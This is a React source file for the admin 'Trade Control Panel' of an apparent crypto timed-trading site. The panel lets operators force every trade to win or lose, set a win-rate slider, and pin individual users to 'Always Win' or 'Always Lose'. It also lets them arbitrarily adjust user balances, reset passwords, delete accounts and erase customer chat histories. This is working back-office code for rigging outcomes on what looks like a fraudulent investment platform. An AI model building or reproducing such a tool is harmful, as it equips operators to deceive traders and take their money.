'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import { Shield, RefreshCw, Users, TrendingUp, TrendingDown, Clock, Loader2, AlertCircle, DollarSign, Plus, Minus, KeyRound, MessageCircle, Send, Paperclip, X as XIcon, Trash2, LogOut, Home } from 'lucide-react';

interface TradeSettingsData {
  globalMode: 'random' | 'all_win' | 'all_lose';
  winRatePercent: number;
  userOverrides: Record<string, string>;
}

interface TradeStats {
  totalTrades: number;
  pendingTrades: number;
  wins: number;
  losses: number;
}

interface RecentTrade {
  id: string;
  transactionId: string;
  user: string;
  userId: string;
  type: string;
  cryptoSymbol: string;
  amount: number;
  period: number;
  profitPercent: number;
  result: string;
  profitAmount: number;
  forcedResult: string | null;
  createdAt: string;
}

interface UserItem {
  id: string;
  name: string;
}

interface UserBalance {
  id: string;
  name: string;
  email: string;
  balance: number;
}

export default function AdminPage() {
  const [adminKey, setAdminKey] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  const [settings, setSettings] = useState<TradeSettingsData | null>(null);
  const [stats, setStats] = useState<TradeStats | null>(null);
  const [recentTrades, setRecentTrades] = useState<RecentTrade[]>([]);
  const [users, setUsers] = useState<UserItem[]>([]);

  // Form state
  const [globalMode, setGlobalMode] = useState<string>('random');
  const [winRate, setWinRate] = useState<number>(50);
  const [selectedUser, setSelectedUser] = useState('');
  const [userOverride, setUserOverride] = useState<string>('');

  // Balance management state
  const [userBalances, setUserBalances] = useState<UserBalance[]>([]);
  const [balanceUserId, setBalanceUserId] = useState('');
  const [balanceAction, setBalanceAction] = useState<string>('increase');
  const [balanceAmount, setBalanceAmount] = useState('');

  // Password reset state
  const [resetUserId, setResetUserId] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Delete user state
  const [deleteConfirmUserId, setDeleteConfirmUserId] = useState<string | null>(null);

  // Chat state
  interface ChatConversation {
    userId: string;
    userName: string;
    userEmail: string;
    lastMessage: string;
    lastSender: string;
    lastTime: string;
    unreadCount: number;
    totalMessages: number;
  }
  interface ChatMsg {
    _id: string;
    sender: 'user' | 'admin';
    senderName: string;
    text: string;
    attachments: { type: 'image' | 'video'; name: string; data: string }[];
    createdAt: string;
  }
  const [chatConversations, setChatConversations] = useState<ChatConversation[]>([]);
  const [activeChatUser, setActiveChatUser] = useState<string | null>(null);
  const [chatMessages, setChatMessages] = useState<ChatMsg[]>([]);
  const [chatInput, setChatInput] = useState('');
  const [chatSending, setChatSending] = useState(false);
  const [chatAttachments, setChatAttachments] = useState<{ type: 'image' | 'video'; name: string; data: string }[]>([]);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const chatFileRef = useRef<HTMLInputElement>(null);

  const headers = useCallback(() => ({
    'Content-Type': 'application/json',
    'x-admin-key': adminKey,
  }), [adminKey]);

  const fetchData = useCallback(async () => {
    setIsLoading(true);
    setError('');
    try {
      const res = await fetch('/api/admin/trade-settings', { headers: headers() });
      if (res.status === 401) {
        setIsAuthenticated(false);
        setError('Invalid admin key');
        return;
      }
      if (!res.ok) throw new Error('Failed to fetch');
      const data = await res.json();
      setSettings(data.settings);
      setStats(data.stats);
      setRecentTrades(data.recentTrades);
      setUsers(data.users);
      setGlobalMode(data.settings.globalMode);
      setWinRate(data.settings.winRatePercent);
      setIsAuthenticated(true);

      // Also fetch balances
      const balRes = await fetch('/api/admin/balance', { headers: headers() });
      if (balRes.ok) {
        const balData = await balRes.json();
        setUserBalances(balData.users);
      }

      // Also fetch chat conversations
      const chatRes = await fetch('/api/admin/chat', { headers: headers() });
      if (chatRes.ok) {
        const chatData = await chatRes.json();
        setChatConversations(chatData.conversations || []);
      }
    } catch (err: any) {
      setError(err.message || 'Failed to load');
    } finally {
      setIsLoading(false);
    }
  }, [headers]);

  const handleLogin = async () => {
    if (!adminKey.trim()) return;
    await fetchData();
  };

  const handleSaveSettings = async () => {
    setError('');
    setSuccess('');
    try {
      const res = await fetch('/api/admin/trade-settings', {
        method: 'PUT',
        headers: headers(),
        body: JSON.stringify({ globalMode, winRatePercent: winRate }),
      });
      if (!res.ok) throw new Error('Failed to save');
      const data = await res.json();
      setSettings(data.settings);
      setSuccess('Settings saved');
      setTimeout(() => setSuccess(''), 3000);
    } catch (err: any) {
      setError(err.message);
    }
  };

  const handleSetUserOverride = async () => {
    if (!selectedUser) return;
    setError('');
    setSuccess('');
    try {
      const res = await fetch('/api/admin/trade-settings', {
        method: 'PUT',
        headers: headers(),
        body: JSON.stringify({
          userOverrides: { [selectedUser]: userOverride || null },
        }),
      });
      if (!res.ok) throw new Error('Failed to save');
      const data = await res.json();
      setSettings(data.settings);
      setSelectedUser('');
      setUserOverride('');
      setSuccess('User override saved');
      setTimeout(() => setSuccess(''), 3000);
    } catch (err: any) {
      setError(err.message);
    }
  };

  const handleAdjustBalance = async () => {
    if (!balanceUserId || !balanceAmount) return;
    setError('');
    setSuccess('');
    try {
      const res = await fetch('/api/admin/balance', {
        method: 'PUT',
        headers: headers(),
        body: JSON.stringify({
          userId: balanceUserId,
          action: balanceAction,
          amount: Number(balanceAmount),
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Failed');
      setSuccess(`Balance updated: ${data.oldBalance.toLocaleString()} → ${data.newBalance.toLocaleString()} USDT`);
      setBalanceAmount('');
      // Refresh balances
      const balRes = await fetch('/api/admin/balance', { headers: headers() });
      if (balRes.ok) {
        const balData = await balRes.json();
        setUserBalances(balData.users);
      }
      setTimeout(() => setSuccess(''), 3000);
    } catch (err: any) {
      setError(err.message);
    }
  };

  const handleResetPassword = async () => {
    if (!resetUserId || !newPassword) return;
    if (newPassword.length < 6) {
      setError('Password must be at least 6 characters');
      return;
    }
    setError('');
    setSuccess('');
    try {
      const res = await fetch('/api/admin/reset-password', {
        method: 'PUT',
        headers: headers(),
        body: JSON.stringify({ userId: resetUserId, newPassword }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Failed');
      setSuccess(data.message);
      setNewPassword('');
      setResetUserId('');
      setTimeout(() => setSuccess(''), 4000);
    } catch (err: any) {
      setError(err.message);
    }
  };

  const handleDeleteUser = async (userId: string) => {
    setError('');
    setSuccess('');
    try {
      const res = await fetch(`/api/admin/users?userId=${userId}`, {
        method: 'DELETE',
        headers: headers(),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Failed to delete user');
      setSuccess(data.message);
      setDeleteConfirmUserId(null);
      // Refresh all data
      fetchData();
      setTimeout(() => setSuccess(''), 5000);
    } catch (err: any) {
      setError(err.message);
    }
  };

  // Chat functions
  const fetchConversations = useCallback(async () => {
    try {
      const res = await fetch('/api/admin/chat', { headers: headers() });
      if (res.ok) {
        const data = await res.json();
        setChatConversations(data.conversations || []);
      }
    } catch {}
  }, [headers]);

  const fetchChatMessages = useCallback(async (userId: string) => {
    try {
      const res = await fetch(`/api/admin/chat?userId=${userId}`, { headers: headers() });
      if (res.ok) {
        const data = await res.json();
        setChatMessages(data.messages || []);
        setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: 'smooth' }), 50);
      }
    } catch {}
  }, [headers]);

  const openChat = (userId: string) => {
    setActiveChatUser(userId);
    setChatMessages([]);
    setChatInput('');
    setChatAttachments([]);
    fetchChatMessages(userId);
  };

  const sendAdminMessage = async () => {
    if (!activeChatUser || (!chatInput.trim() && chatAttachments.length === 0) || chatSending) return;
    setChatSending(true);
    try {
      const res = await fetch('/api/admin/chat', {
        method: 'POST',
        headers: headers(),
        body: JSON.stringify({
          userId: activeChatUser,
          text: chatInput.trim(),
          attachments: chatAttachments,
        }),
      });
      if (res.ok) {
        setChatInput('');
        setChatAttachments([]);
        fetchChatMessages(activeChatUser);
        fetchConversations();
      }
    } catch {}
    setChatSending(false);
  };

  const deleteChatMessage = async (messageId: string) => {
    try {
      const res = await fetch(`/api/admin/chat?messageId=${messageId}`, {
        method: 'DELETE',
        headers: headers(),
      });
      if (res.ok) {
        setChatMessages((prev) => prev.filter((m) => m._id !== messageId));
      }
    } catch {}
  };

  const deleteConversation = async (userId: string) => {
    if (!confirm('Delete entire conversation? This cannot be undone.')) return;
    try {
      const res = await fetch(`/api/admin/chat?userId=${userId}`, {
        method: 'DELETE',
        headers: headers(),
      });
      if (res.ok) {
        setActiveChatUser(null);
        fetchConversations();
      }
    } catch {}
  };

  const handleChatFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files) return;
    Array.from(files).forEach((file) => {
      if (file.size > 5 * 1024 * 1024) { alert('Max 5MB'); return; }
      const isImage = file.type.startsWith('image/');
      const isVideo = file.type.startsWith('video/');
      if (!isImage && !isVideo) { alert('Images/videos only'); return; }
      const reader = new FileReader();
      reader.onload = () => {
        setChatAttachments((prev) => prev.length >= 3 ? prev : [...prev, {
          type: isImage ? 'image' : 'video',
          name: file.name,
          data: reader.result as string,
        }]);
      };
      reader.readAsDataURL(file);
    });
    e.target.value = '';
  };

  // Poll chat messages for active conversation
  useEffect(() => {
    if (!activeChatUser || !isAuthenticated) return;
    const interval = setInterval(() => fetchChatMessages(activeChatUser), 4000);
    return () => clearInterval(interval);
  }, [activeChatUser, isAuthenticated, fetchChatMessages]);

  const removeUserOverride = async (userId: string) => {
    try {
      const res = await fetch('/api/admin/trade-settings', {
        method: 'PUT',
        headers: headers(),
        body: JSON.stringify({
          userOverrides: { [userId]: null },
        }),
      });
      if (!res.ok) throw new Error('Failed to remove');
      const data = await res.json();
      setSettings(data.settings);
    } catch (err: any) {
      setError(err.message);
    }
  };

  // Login screen
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
        <div className="glass-card w-full max-w-sm p-6 space-y-4">
          <div className="text-center">
            <Shield className="mx-auto mb-2 text-accent" size={32} />
            <h1 className="text-lg font-bold">Admin Panel</h1>
            <p className="text-xs text-gray-400">Enter your admin secret key</p>
          </div>
          {error && (
            <div className="p-2 rounded bg-danger/20 text-danger text-xs flex items-center gap-1.5">
              <AlertCircle size={12} /> {error}
            </div>
          )}
          <input
            type="password"
            value={adminKey}
            onChange={(e) => setAdminKey(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
            placeholder="Admin secret key"
            className="w-full px-3 py-2 rounded-lg bg-white/5 border border-white/10 focus:border-accent focus:outline-none text-sm"
          />
          <button
            onClick={handleLogin}
            disabled={isLoading}
            className="w-full py-2 rounded-lg bg-accent hover:bg-accent/80 font-semibold text-sm transition-colors disabled:opacity-50"
          >
            {isLoading ? 'Verifying...' : 'Access Admin Panel'}
          </button>
        </div>
      </div>
    );
  }

  const winPercent = stats && stats.totalTrades > 0
    ? ((stats.wins / (stats.wins + stats.losses)) * 100).toFixed(1)
    : '0.0';

  return (
    <div className="min-h-screen bg-[#0a0a0a] p-4 max-w-5xl mx-auto space-y-4">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Shield className="text-accent" size={24} />
          <h1 className="text-lg font-bold">Trade Control Panel</h1>
        </div>
        <div className="flex items-center gap-2">
          <a
            href="/"
            className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs text-gray-400 hover:text-white hover:bg-white/10 transition-colors"
          >
            <Home size={14} />
            <span className="hidden sm:inline">Back to Site</span>
          </a>
          <button
            onClick={() => { setIsAuthenticated(false); setAdminKey(''); }}
            className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs text-gray-400 hover:text-danger hover:bg-danger/10 transition-colors"
            title="Logout"
          >
            <LogOut size={14} />
            <span className="hidden sm:inline">Logout</span>
          </button>
          <button
            onClick={fetchData}
            className="p-2 rounded-lg hover:bg-white/10 transition-colors"
            title="Refresh"
          >
            <RefreshCw size={16} className={isLoading ? 'animate-spin' : ''} />
          </button>
        </div>
      </div>

      {/* Messages */}
      {error && (
        <div className="p-2 rounded bg-danger/20 text-danger text-xs">{error}</div>
      )}
      {success && (
        <div className="p-2 rounded bg-success/20 text-success text-xs">{success}</div>
      )}

      {/* Stats */}
      {stats && (
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <div className="glass-card p-3 text-center">
            <p className="text-[10px] text-gray-400">Total Trades</p>
            <p className="text-xl font-bold">{stats.totalTrades}</p>
          </div>
          <div className="glass-card p-3 text-center">
            <p className="text-[10px] text-gray-400">Pending</p>
            <p className="text-xl font-bold text-yellow-400">{stats.pendingTrades}</p>
          </div>
          <div className="glass-card p-3 text-center">
            <p className="text-[10px] text-gray-400">Wins</p>
            <p className="text-xl font-bold text-success">{stats.wins}</p>
          </div>
          <div className="glass-card p-3 text-center">
            <p className="text-[10px] text-gray-400">Losses</p>
            <p className="text-xl font-bold text-danger">{stats.losses}</p>
          </div>
        </div>
      )}

      <div className="grid md:grid-cols-2 gap-4">
        {/* Global Settings */}
        <div className="glass-card p-4 space-y-4">
          <h2 className="text-sm font-bold flex items-center gap-1.5">
            <TrendingUp size={14} className="text-accent" /> Global Trade Mode
          </h2>

          <div className="space-y-2">
            {[
              { value: 'random', label: 'Random', desc: 'Uses win rate percentage below' },
              { value: 'all_win', label: 'All Win', desc: 'Every trade wins' },
              { value: 'all_lose', label: 'All Lose', desc: 'Every trade loses' },
            ].map((mode) => (
              <label
                key={mode.value}
                className={`flex items-center gap-3 p-2.5 rounded-lg border cursor-pointer transition-all ${
                  globalMode === mode.value
                    ? 'border-accent bg-accent/10'
                    : 'border-white/10 bg-white/5 hover:bg-white/10'
                }`}
              >
                <input
                  type="radio"
                  name="globalMode"
                  value={mode.value}
                  checked={globalMode === mode.value}
                  onChange={(e) => setGlobalMode(e.target.value)}
                  className="accent-accent"
                />
                <div>
                  <p className="text-sm font-medium">{mode.label}</p>
                  <p className="text-[10px] text-gray-400">{mode.desc}</p>
                </div>
              </label>
            ))}
          </div>

          {globalMode === 'random' && (
            <div>
              <label className="text-xs text-gray-400 mb-1 block">
                Win Rate: <span className="text-white font-bold">{winRate}%</span>
              </label>
              <input
                type="range"
                min={0}
                max={100}
                value={winRate}
                onChange={(e) => setWinRate(Number(e.target.value))}
                className="w-full accent-accent"
              />
              <div className="flex justify-between text-[10px] text-gray-500">
                <span>0% (always lose)</span>
                <span>100% (always win)</span>
              </div>
            </div>
          )}

          <button
            onClick={handleSaveSettings}
            className="w-full py-2 rounded-lg bg-accent hover:bg-accent/80 font-semibold text-sm transition-colors"
          >
            Save Settings
          </button>
        </div>

        {/* Per-User Overrides */}
        <div className="glass-card p-4 space-y-4">
          <h2 className="text-sm font-bold flex items-center gap-1.5">
            <Users size={14} className="text-accent" /> User Overrides
          </h2>

          <p className="text-[10px] text-gray-400">
            Override global settings for a specific user. User overrides take priority over global mode.
          </p>

          <div className="flex gap-2">
            <select
              value={selectedUser}
              onChange={(e) => setSelectedUser(e.target.value)}
              className="flex-1 px-2 py-1.5 rounded-lg bg-white/5 border border-white/10 text-xs focus:border-accent focus:outline-none"
            >
              <option value="">Select user...</option>
              {users.map((u) => (
                <option key={u.id} value={u.id}>{u.name}</option>
              ))}
            </select>
            <select
              value={userOverride}
              onChange={(e) => setUserOverride(e.target.value)}
              className="px-2 py-1.5 rounded-lg bg-white/5 border border-white/10 text-xs focus:border-accent focus:outline-none"
            >
              <option value="">Auto</option>
              <option value="win">Always Win</option>
              <option value="lose">Always Lose</option>
            </select>
            <button
              onClick={handleSetUserOverride}
              disabled={!selectedUser}
              className="px-3 py-1.5 rounded-lg bg-accent hover:bg-accent/80 text-xs font-semibold disabled:opacity-50 transition-colors"
            >
              Set
            </button>
          </div>

          {/* Active overrides */}
          {settings && Object.keys(settings.userOverrides).length > 0 ? (
            <div className="space-y-1">
              <p className="text-[10px] text-gray-400 font-semibold">Active Overrides:</p>
              {Object.entries(settings.userOverrides).map(([userId, override]) => {
                const userName = users.find((u) => u.id === userId)?.name || userId;
                return (
                  <div key={userId} className="flex items-center justify-between p-2 rounded-lg bg-white/5 text-xs">
                    <span>{userName}</span>
                    <div className="flex items-center gap-2">
                      <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold ${
                        override === 'win' ? 'bg-success/20 text-success' : 'bg-danger/20 text-danger'
                      }`}>
                        {override.toUpperCase()}
                      </span>
                      <button
                        onClick={() => removeUserOverride(userId)}
                        className="text-gray-400 hover:text-danger text-[10px] underline"
                      >
                        Remove
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          ) : (
            <p className="text-[10px] text-gray-500 italic">No user overrides active</p>
          )}
        </div>
      </div>

      {/* Balance Management */}
      <div className="glass-card p-4 space-y-3">
        <h2 className="text-sm font-bold flex items-center gap-1.5">
          <DollarSign size={14} className="text-accent" /> User Balance Management
        </h2>

        {/* Adjust Balance */}
        <div className="flex flex-wrap gap-2 items-end">
          <div className="flex-1 min-w-[120px]">
            <label className="block text-[10px] text-gray-400 mb-0.5">User</label>
            <select
              value={balanceUserId}
              onChange={(e) => setBalanceUserId(e.target.value)}
              className="w-full bg-gray-800 border border-gray-700 text-xs rounded px-2 py-1.5"
            >
              <option value="">Select user</option>
              {userBalances.map((u) => (
                <option key={u.id} value={u.id}>{u.name || u.email}</option>
              ))}
            </select>
          </div>
          <div className="w-[100px]">
            <label className="block text-[10px] text-gray-400 mb-0.5">Action</label>
            <select
              value={balanceAction}
              onChange={(e) => setBalanceAction(e.target.value)}
              className="w-full bg-gray-800 border border-gray-700 text-xs rounded px-2 py-1.5"
            >
              <option value="increase">+ Increase</option>
              <option value="decrease">- Decrease</option>
              <option value="set">= Set to</option>
            </select>
          </div>
          <div className="w-[120px]">
            <label className="block text-[10px] text-gray-400 mb-0.5">Amount (USDT)</label>
            <input
              type="number"
              min="0"
              value={balanceAmount}
              onChange={(e) => setBalanceAmount(e.target.value)}
              placeholder="0.00"
              className="w-full bg-gray-800 border border-gray-700 text-xs rounded px-2 py-1.5"
            />
          </div>
          <button
            onClick={handleAdjustBalance}
            disabled={!balanceUserId || !balanceAmount}
            className="px-3 py-1.5 bg-accent text-black text-xs font-bold rounded disabled:opacity-40"
          >
            Apply
          </button>
        </div>

        {/* User Balance Table */}
        {userBalances.length > 0 && (
          <div className="overflow-x-auto">
            <table className="w-full text-[11px]">
              <thead>
                <tr className="text-gray-400 border-b border-gray-800">
                  <th className="text-left py-1 pr-2">User</th>
                  <th className="text-left py-1 pr-2">Email</th>
                  <th className="text-right py-1 pr-2">Balance (USDT)</th>
                  <th className="text-center py-1">Quick</th>
                  <th className="text-center py-1">Actions</th>
                </tr>
              </thead>
              <tbody>
                {userBalances.map((u) => (
                  <tr key={u.id} className="border-b border-gray-800/50">
                    <td className="py-1.5 pr-2 font-medium">{u.name || '—'}</td>
                    <td className="py-1.5 pr-2 text-gray-400">{u.email}</td>
                    <td className="py-1.5 pr-2 text-right font-mono text-accent">{u.balance.toLocaleString()}</td>
                    <td className="py-1.5 text-center">
                      <div className="flex gap-1 justify-center">
                        <button
                          onClick={() => { setBalanceUserId(u.id); setBalanceAction('increase'); setBalanceAmount('1000'); }}
                          className="p-0.5 rounded bg-green-900/40 text-green-400 hover:bg-green-900/70"
                          title="Quick +1000"
                        >
                          <Plus size={12} />
                        </button>
                        <button
                          onClick={() => { setBalanceUserId(u.id); setBalanceAction('decrease'); setBalanceAmount('1000'); }}
                          className="p-0.5 rounded bg-red-900/40 text-red-400 hover:bg-red-900/70"
                          title="Quick -1000"
                        >
                          <Minus size={12} />
                        </button>
                      </div>
                    </td>
                    <td className="py-1.5 text-center">
                      {deleteConfirmUserId === u.id ? (
                        <div className="flex items-center gap-1 justify-center">
                          <button
                            onClick={() => handleDeleteUser(u.id)}
                            className="px-2 py-0.5 rounded bg-danger text-white text-[10px] font-bold hover:bg-red-500 transition-colors"
                          >
                            Confirm
                          </button>
                          <button
                            onClick={() => setDeleteConfirmUserId(null)}
                            className="px-2 py-0.5 rounded bg-white/10 text-gray-400 text-[10px] hover:text-white transition-colors"
                          >
                            Cancel
                          </button>
                        </div>
                      ) : (
                        <button
                          onClick={() => setDeleteConfirmUserId(u.id)}
                          className="p-0.5 rounded bg-red-900/30 text-red-400 hover:bg-red-900/60 hover:text-red-300 transition-colors"
                          title={`Delete ${u.name || u.email}`}
                        >
                          <Trash2 size={12} />
                        </button>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Password Reset */}
      <div className="glass-card p-4 space-y-3">
        <h2 className="text-sm font-bold flex items-center gap-1.5">
          <KeyRound size={14} className="text-accent" /> Reset User Password
        </h2>
        <p className="text-[10px] text-gray-400">Reset password for users who forgot their password or can&apos;t access their email.</p>

        <div className="flex flex-wrap gap-2 items-end">
          <div className="flex-1 min-w-[140px]">
            <label className="block text-[10px] text-gray-400 mb-0.5">User</label>
            <select
              value={resetUserId}
              onChange={(e) => setResetUserId(e.target.value)}
              className="w-full bg-gray-800 border border-gray-700 text-xs rounded px-2 py-1.5"
            >
              <option value="">Select user</option>
              {userBalances.map((u) => (
                <option key={u.id} value={u.id}>{u.name || u.email} ({u.email})</option>
              ))}
            </select>
          </div>
          <div className="flex-1 min-w-[140px]">
            <label className="block text-[10px] text-gray-400 mb-0.5">New Password</label>
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
                placeholder="Min 6 characters"
                className="w-full bg-gray-800 border border-gray-700 text-xs rounded px-2 py-1.5 pr-14"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-[9px] text-gray-400 hover:text-white"
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>
          </div>
          <button
            onClick={handleResetPassword}
            disabled={!resetUserId || newPassword.length < 6}
            className="px-3 py-1.5 bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold rounded disabled:opacity-40 transition-colors"
          >
            Reset Password
          </button>
        </div>
      </div>

      {/* Recent Trades */}
      <div className="glass-card p-4 space-y-3">
        <h2 className="text-sm font-bold flex items-center gap-1.5">
          <Clock size={14} className="text-accent" /> Recent Timed Trades
        </h2>
        {recentTrades.length === 0 ? (
          <p className="text-xs text-gray-500 italic">No trades yet</p>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-[11px]">
              <thead>
                <tr className="text-gray-400 border-b border-white/10">
                  <th className="text-left py-1.5 px-2">User</th>
                  <th className="text-left py-1.5 px-2">Type</th>
                  <th className="text-left py-1.5 px-2">Symbol</th>
                  <th className="text-right py-1.5 px-2">Amount</th>
                  <th className="text-center py-1.5 px-2">Period</th>
                  <th className="text-center py-1.5 px-2">Result</th>
                  <th className="text-right py-1.5 px-2">Profit</th>
                  <th className="text-right py-1.5 px-2">Time</th>
                </tr>
              </thead>
              <tbody>
                {recentTrades.map((t) => (
                  <tr key={t.id} className="border-b border-white/5 hover:bg-white/5">
                    <td className="py-1.5 px-2 truncate max-w-[100px]">{t.user}</td>
                    <td className={`py-1.5 px-2 font-semibold ${t.type === 'buy' ? 'text-success' : 'text-danger'}`}>
                      {t.type.toUpperCase()}
                    </td>
                    <td className="py-1.5 px-2">{t.cryptoSymbol}</td>
                    <td className="py-1.5 px-2 text-right">{t.amount.toLocaleString()}</td>
                    <td className="py-1.5 px-2 text-center">{t.period}s</td>
                    <td className="py-1.5 px-2 text-center">
                      <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold ${
                        t.result === 'win' ? 'bg-success/20 text-success' :
                        t.result === 'lose' ? 'bg-danger/20 text-danger' :
                        'bg-yellow-500/20 text-yellow-400'
                      }`}>
                        {t.result.toUpperCase()}
                      </span>
                    </td>
                    <td className={`py-1.5 px-2 text-right ${t.result === 'win' ? 'text-success' : ''}`}>
                      {t.result === 'win' ? `+${t.profitAmount.toLocaleString()}` : '—'}
                    </td>
                    <td className="py-1.5 px-2 text-right text-gray-400">
                      {new Date(t.createdAt).toLocaleTimeString()}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Customer Chat */}
      <div className="glass-card p-4 space-y-3">
        <div className="flex items-center justify-between">
          <h2 className="text-sm font-bold flex items-center gap-1.5">
            <MessageCircle size={14} className="text-accent" /> Customer Chat
            {chatConversations.reduce((s, c) => s + c.unreadCount, 0) > 0 && (
              <span className="ml-1 px-1.5 py-0.5 rounded-full bg-danger text-[9px] text-white font-bold">
                {chatConversations.reduce((s, c) => s + c.unreadCount, 0)}
              </span>
            )}
          </h2>
          <button onClick={fetchConversations} className="text-[10px] text-gray-400 hover:text-white">
            <RefreshCw size={12} />
          </button>
        </div>

        {activeChatUser ? (
          <>
            {/* Chat header */}
            <div className="flex items-center justify-between bg-white/5 rounded-lg px-3 py-2">
              <div>
                <p className="text-xs font-bold">
                  {chatConversations.find((c) => c.userId === activeChatUser)?.userName || 'User'}
                </p>
                <p className="text-[9px] text-gray-400">
                  {chatConversations.find((c) => c.userId === activeChatUser)?.userEmail}
                </p>
              </div>
              <div className="flex gap-1.5">
                <button
                  onClick={() => deleteConversation(activeChatUser!)}
                  className="text-[10px] text-danger hover:text-red-300 px-2 py-1 rounded bg-danger/10"
                >
                  Delete All
                </button>
                <button
                  onClick={() => { setActiveChatUser(null); fetchConversations(); }}
                  className="text-[10px] text-gray-400 hover:text-white px-2 py-1 rounded bg-white/5"
                >
                  ← Back
                </button>
              </div>
            </div>

            {/* Messages */}
            <div className="h-64 overflow-y-auto space-y-2 bg-black/20 rounded-lg p-3">
              {chatMessages.length === 0 ? (
                <p className="text-[10px] text-gray-500 text-center mt-8">No messages</p>
              ) : (
                chatMessages.map((msg) => (
                  <div key={msg._id} className={`group flex ${msg.sender === 'admin' ? 'justify-end' : 'justify-start'}`}>
                    <div className={`relative max-w-[75%] rounded-lg px-2.5 py-1.5 space-y-1 ${
                      msg.sender === 'admin' ? 'bg-accent/20 rounded-br-sm' : 'bg-white/10 rounded-bl-sm'
                    }`}>
                      <button
                        onClick={() => deleteChatMessage(msg._id)}
                        className="absolute -top-1.5 -right-1.5 w-4 h-4 rounded-full bg-danger/80 text-white items-center justify-center text-[8px] hidden group-hover:flex hover:bg-danger"
                        title="Delete message"
                      >
                        ×
                      </button>
                      <p className="text-[9px] text-gray-400 font-medium">{msg.senderName}</p>
                      {msg.attachments?.map((att, i) => (
                        <div key={i}>
                          {att.type === 'image' ? (
                            <img src={att.data} alt={att.name} className="max-w-full rounded max-h-32" />
                          ) : (
                            <video src={att.data} controls className="max-w-full rounded max-h-32" />
                          )}
                        </div>
                      ))}
                      {msg.text && <p className="text-[11px] whitespace-pre-wrap break-words">{msg.text}</p>}
                      <p className="text-[8px] text-gray-500">{new Date(msg.createdAt).toLocaleTimeString()}</p>
                    </div>
                  </div>
                ))
              )}
              <div ref={chatEndRef} />
            </div>

            {/* Pending attachments */}
            {chatAttachments.length > 0 && (
              <div className="flex gap-1.5">
                {chatAttachments.map((att, i) => (
                  <div key={i} className="relative w-12 h-12 rounded overflow-hidden bg-white/5">
                    {att.type === 'image' ? (
                      <img src={att.data} alt="" className="w-full h-full object-cover" />
                    ) : (
                      <div className="w-full h-full flex items-center justify-center text-[8px] text-gray-400">VID</div>
                    )}
                    <button
                      onClick={() => setChatAttachments((p) => p.filter((_, idx) => idx !== i))}
                      className="absolute -top-0.5 -right-0.5 w-3.5 h-3.5 rounded-full bg-danger text-white flex items-center justify-center"
                    >
                      <XIcon size={8} />
                    </button>
                  </div>
                ))}
              </div>
            )}

            {/* Input */}
            <div className="flex gap-1.5 items-end">
              <button onClick={() => chatFileRef.current?.click()} className="p-1.5 rounded bg-white/5 text-gray-400 hover:text-white">
                <Paperclip size={14} />
              </button>
              <input ref={chatFileRef} type="file" accept="image/*,video/*" multiple onChange={handleChatFile} className="hidden" />
              <input
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                onKeyDown={(e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendAdminMessage(); } }}
                placeholder="Type a reply..."
                className="flex-1 bg-gray-800 border border-gray-700 text-xs rounded px-2 py-1.5"
              />
              <button
                onClick={sendAdminMessage}
                disabled={chatSending || (!chatInput.trim() && chatAttachments.length === 0)}
                className="p-1.5 rounded bg-accent text-black disabled:opacity-30"
              >
                <Send size={14} />
              </button>
            </div>
          </>
        ) : (
          <>
            {/* Conversation list */}
            {chatConversations.length === 0 ? (
              <p className="text-[10px] text-gray-500 italic">No conversations yet</p>
            ) : (
              <div className="space-y-1">
                {chatConversations.map((c) => (
                  <button
                    key={c.userId}
                    onClick={() => openChat(c.userId)}
                    className="w-full flex items-center justify-between p-2 rounded-lg bg-white/5 hover:bg-white/10 transition-colors text-left"
                  >
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-1.5">
                        <p className="text-xs font-medium truncate">{c.userName}</p>
                        {c.unreadCount > 0 && (
                          <span className="px-1.5 py-0.5 rounded-full bg-danger text-[9px] text-white font-bold flex-shrink-0">
                            {c.unreadCount}
                          </span>
                        )}
                      </div>
                      <p className="text-[9px] text-gray-400 truncate">{c.userEmail}</p>
                      <p className="text-[10px] text-gray-500 truncate mt-0.5">
                        {c.lastSender === 'admin' ? 'You: ' : ''}{c.lastMessage}
                      </p>
                    </div>
                    <p className="text-[9px] text-gray-500 flex-shrink-0 ml-2">
                      {new Date(c.lastTime).toLocaleDateString([], { month: 'short', day: 'numeric' })}
                    </p>
                  </button>
                ))}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
}
